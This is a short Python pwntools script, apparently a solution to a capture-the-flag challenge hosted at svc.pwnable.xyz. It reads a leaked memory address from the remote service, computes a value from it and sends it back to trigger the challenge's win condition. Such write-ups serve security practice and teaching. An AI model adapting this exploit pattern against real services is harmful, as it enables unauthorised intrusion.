from pwn import *

def main():
    #p = process("./challenge")
    p = remote("svc.pwnable.xyz", 30000)
    p.recvuntil("Leak: ")
    addr = int(p.recvline(), 16)
    print(hex(addr))
    calc_addr = (0xffff_ffff_ffff_ffff - addr) * -1
    p.sendline(str(calc_addr))
    p.sendline("a")
    print(p.recvall().decode())

if __name__ == "__main__":
    main()
